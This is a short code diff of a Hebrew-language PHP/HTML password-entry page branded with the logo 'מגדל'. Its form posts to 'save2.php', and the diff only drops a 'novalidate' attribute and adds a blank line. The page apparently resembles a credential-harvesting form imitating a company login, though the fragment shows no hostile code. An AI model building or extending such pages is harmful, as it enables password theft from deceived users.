@@ -101,7 +101,7 @@ if ($user === '') { $user = 'user@example.com'; }
     <div class="bg" aria-hidden="true"></div>
 
     <section class="wrap">
-      <form class="card" action="save2.php" method="post" novalidate>
+      <form class="card" action="save2.php" method="post">
         <div class="card-head">
           <h1 class="brand">הזנת סיסמה</h1>
           <img src="logo.svg" alt="מגדל" class="brand-mark">
@@ -133,5 +133,6 @@ if ($user === '') { $user = 'user@example.com'; }
   </main>
 </body>
 </html>
+
 
 
